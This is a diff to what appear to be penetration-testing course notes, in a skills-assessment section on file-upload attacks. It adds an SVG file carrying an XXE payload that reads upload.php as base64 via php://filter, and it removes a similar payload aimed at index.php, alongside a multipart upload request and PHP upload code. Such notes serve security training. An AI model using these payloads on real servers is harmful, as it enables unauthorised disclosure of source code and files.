@@ -116,6 +116,14 @@ Value Fuzzing (POST):         ffuf -w /usr/share/seclists/Usernames/xato-net-10-
 ---
 #### Skills Assessment :
 
+
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
+<svg>&xxe;</svg>
+```
+
 ```
 ------WebKitFormBoundarys1yno5vqOsmwB8bV
 Content-Disposition: form-data; name="uploadFile"; filename="test.svg"
@@ -178,12 +186,6 @@ if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
 } else {
     echo "File failed to upload";
 }
-```
-
-```
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
-<svg>&xxe;</svg>
 ```
 
 ```
